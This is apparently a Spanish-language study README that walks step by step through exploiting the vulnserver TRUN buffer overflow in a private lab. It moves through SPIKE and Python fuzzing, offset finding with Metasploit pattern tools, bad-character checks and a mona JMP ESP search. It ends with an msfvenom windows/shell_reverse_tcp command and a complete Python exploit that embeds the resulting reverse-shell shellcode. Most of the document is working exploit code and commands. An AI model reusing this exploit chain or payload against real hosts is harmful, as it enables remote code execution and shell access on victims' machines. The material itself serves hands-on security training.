# -Buffer-Overflow-

Representacion grafica de que es lo que pasa cuando se genera un BoF

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/98bf083c-df68-4159-be95-a1fa29715c99)


El Define una serie de pasos lo cual me parece bien para hacer esto ordenado

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/b06f1f2e-9796-4e70-a11f-fa9542521428)

Cada uno de estos pasos son:

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/3ae16b52-ff6b-4fdc-97a0-40dc66449f43)


## 1. Spike (generic_send_tcp)

When you need to analyze a new network protocol for buffer overflows or similar weaknesses, the SPIKE is the tool of choice for professionals. While it requires a strong knowledge of C to use, it produces results second to none in the field. (ojo tiene muchas herramientas no solo generic send)

```
sudo apt install spike
```
> https://www.kali.org/tools/spike/

Y el modo de uso es:

```bash
# La ip sera del vuln server

./generic_send_tcp host port spike_script SKIPVAR SKIPSTR

./generic_send_tcp 192.168.0.100 9999 something.spk 0 0

```

El script en spike que el escribio es el siguiente 

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/bbafb67f-1e2e-42c1-bce9-c1e62fb56a50)

Y lo que va a hacer esto es enviar peticiones a cada una de las  funciones del vuln server. (por defecto esta escuchando en el puerto 9999 el VULN server)

```bash
s_readline();
s_string("TRUN ");
s_string_variable("0");

```

Ya en mi maquina pues comenzamos con el spike.

```bash
./generic_send_tcp 192.168.0.100 9999 something.spk 0 0

```

Nos damos cuenta que algo falla porque.

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/5f0aaf08-750b-480b-bd24-fc29ea0a3def)

Sobre escribimos el EIP con puras A (41) y de hecho en Kali igual esta la prueba.

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/aa415ef2-62a9-4886-ae6b-a982e017184e)

## 2. Fuzzing 

En el video lo hace con el depurador abierto cosa que yo no puedo nunca cae en el except lo que hice fue dejar corriendo el programa y al parecer si me funciono.

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/59519020-873f-4e79-8e15-dc15c1e002ad)

```python
#!/usr/bin/python3

import sys, socket

from time import sleep

buffer = "A" * 100

while True:
        try:
                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.230.129',9999))

                payload= "TRUN /.:/" + buffer

                s.send((payload.encode()))
                s.close()
                sleep(1)
                buffer = buffer + "A" * 100
        except:
                print ("Fuzzing crashed at %s bytes" % str(len(buffer)))        
                sys.exit()

```

## 3. Encontrar el offset

Vamos a ver exactamente que ofset sobre escribe el EIP.

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
```

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/bd4e4ba8-7df6-461c-aab6-606b4497b6f1)


```python
import sys, socket

from time import sleep

buffer = "A" * 100

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"

while True:
        try:
                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.230.129',9999))

                payload= "TRUN /.:/" + offset

                s.send((payload.encode()))
                s.close()
                sleep(1)
                buffer = buffer + "A" * 100
        except:
                print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
                sys.exit()
```

Vamos a verificar qu si se pudiera escribir una B osea 42 en el EIP 

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/8e144d49-fb5c-40bf-92e9-b978ec1c8529)


```python
#!/usr/bin/python3

import sys, socket

from time import sleep

shellcode = "A" * 2003 + "B" * 4


while True:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.230.129',9999))

		payload= "TRUN /.:/" + shellcode

		s.send((payload.encode()))
		s.close()
		sleep(1)
		buffer = buffer + "A" * 100
	except:
		print ("Fuzzing crashed at %s bytes" % str(len(shellcode)))	
		sys.exit()
```

## 4. Find bad chars

Vamos a configurar que mona guarde archivos en el dir C:\mona

```
!mona config -set workingfolder c:\mona
```

Por defecto el 00 o null es un bad char porque en windows con eso acaban las cadenas y asi el SO sabe donde acaba (no se  si en linux fucnione asi). 

> https://github.com/cytopia/badchars

Metemeos esos badchars con el script

```python
#!/usr/bin/python3

import sys, socket
from time import sleep


badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)



shellcode = "A" * 2003 + "B" * 4 + badchars


while True:
        try:
                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.230.129',9999))

                payload= "TRUN /.:/" + shellcode

                s.send((payload.encode()))
                s.close()
                sleep(1)
                buffer = buffer + "A" * 100
        except:
                print ("Fuzzing crashed at %s bytes" % str(len(shellcode)))
                sys.exit()


```

Se puede usar mona

```
!mona bytearray -cpb "\x00"
```
Esto genera un archivo .bin lo que sigue es compararlo en este caso no pude poner a mona en el disco C: entonces tienes que poner toda la ruta.

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/23ba5603-0a0b-4a43-bdc7-1311e7e2cb43)

Vamos a encontrar los modulos que no tienen proteccion:

```
!mona modules
```

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/5816b9fb-79a4-4b62-aa3c-16eb1ec4c9e7)

AHORA  ya vimos que de essfunc.dll no tiene protecciones por lo tanto necesitamos apuntar ahi en donde este un JMP ESP para que despues llame a nuestra shellcode.

```
!mona jmp -r ESP  -m "essfunc.dll"
```
![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/07b20cf5-c808-4d59-b0ff-d9dcd03a3852)


Vamos a usar esa direccion para que apunte a JMP ESP y esa a nuestra shellcode.


![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/68dd75da-7d33-423b-9b5d-65ddccbbd41d)



## Creando shellcode

Vamos a usar el msfvenom

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.230.128 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
-f formato en c
-a arquitectura x86
-b bad characters
```

Y pon la shell code que se genero en el script

```python

#!/usr/bin/python3

import sys, socket
from time import sleep

overflow = (
b"\xdb\xcb\xba\x9f\x23\x91\x62\xd9\x74\x24\xf4\x58\x29\xc9"
b"\xb1\x52\x31\x50\x17\x83\xe8\xfc\x03\xcf\x30\x73\x97\x13"
b"\xde\xf1\x58\xeb\x1f\x96\xd1\x0e\x2e\x96\x86\x5b\x01\x26"
b"\xcc\x09\xae\xcd\x80\xb9\x25\xa3\x0c\xce\x8e\x0e\x6b\xe1"
b"\x0f\x22\x4f\x60\x8c\x39\x9c\x42\xad\xf1\xd1\x83\xea\xec"
b"\x18\xd1\xa3\x7b\x8e\xc5\xc0\x36\x13\x6e\x9a\xd7\x13\x93"
b"\x6b\xd9\x32\x02\xe7\x80\x94\xa5\x24\xb9\x9c\xbd\x29\x84"
b"\x57\x36\x99\x72\x66\x9e\xd3\x7b\xc5\xdf\xdb\x89\x17\x18"
b"\xdb\x71\x62\x50\x1f\x0f\x75\xa7\x5d\xcb\xf0\x33\xc5\x98"
b"\xa3\x9f\xf7\x4d\x35\x54\xfb\x3a\x31\x32\x18\xbc\x96\x49"
b"\x24\x35\x19\x9d\xac\x0d\x3e\x39\xf4\xd6\x5f\x18\x50\xb8"
b"\x60\x7a\x3b\x65\xc5\xf1\xd6\x72\x74\x58\xbf\xb7\xb5\x62"
b"\x3f\xd0\xce\x11\x0d\x7f\x65\xbd\x3d\x08\xa3\x3a\x41\x23"
b"\x13\xd4\xbc\xcc\x64\xfd\x7a\x98\x34\x95\xab\xa1\xde\x65"
b"\x53\x74\x70\x35\xfb\x27\x31\xe5\xbb\x97\xd9\xef\x33\xc7"
b"\xfa\x10\x9e\x60\x90\xeb\x49\x4f\xcd\x15\x09\x27\x0c\xd9"
b"\x1b\xe4\x99\x3f\x71\x04\xcc\xe8\xee\xbd\x55\x62\x8e\x42"
b"\x40\x0f\x90\xc9\x67\xf0\x5f\x3a\x0d\xe2\x08\xca\x58\x58"
b"\x9e\xd5\x76\xf4\x7c\x47\x1d\x04\x0a\x74\x8a\x53\x5b\x4a"
b"\xc3\x31\x71\xf5\x7d\x27\x88\x63\x45\xe3\x57\x50\x48\xea"
b"\x1a\xec\x6e\xfc\xe2\xed\x2a\xa8\xba\xbb\xe4\x06\x7d\x12"
b"\x47\xf0\xd7\xc9\x01\x94\xae\x21\x92\xe2\xae\x6f\x64\x0a"
b"\x1e\xc6\x31\x35\xaf\x8e\xb5\x4e\xcd\x2e\x39\x85\x55\x4e"
b"\xd8\x0f\xa0\xe7\x45\xda\x09\x6a\x76\x31\x4d\x93\xf5\xb3"
b"\x2e\x60\xe5\xb6\x2b\x2c\xa1\x2b\x46\x3d\x44\x4b\xf5\x3e"
b"\x4d")


shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62"  + b"\x90" * 16 + overflow

print ("Vamos...1")

while True:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.230.129',9999))

		payload= b"TRUN /.:/" + shellcode

		s.send((payload))
		s.close()
		sleep(1)
		#buffer = buffer + "A" * 100
	except:
		print ("Fuzzing crashed at %s bytes" % str(len(shellcode)))	
		sys.exit()
```





